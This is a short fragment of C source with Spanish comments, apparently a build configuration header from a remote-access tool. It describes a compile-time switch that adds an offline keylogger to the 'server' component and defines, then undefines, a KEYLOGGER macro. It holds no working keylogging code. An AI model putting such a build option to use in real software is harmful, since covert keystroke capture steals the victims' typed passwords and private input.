...
/*###############################################################################
** Keylogger:
**	Si se define la compilación en modo 'keylogger' se agregará el keylogger
**	offline al server. Esto implica un aumento considerable del código y en
**	consecuencia su peso. 
**	NOTA:{
**		Se añaden diversas nuevas APIs y nuevas cadenas.
**	}
*###############################################################################*/
#define KEYLOGGER
#undef	KEYLOGGER
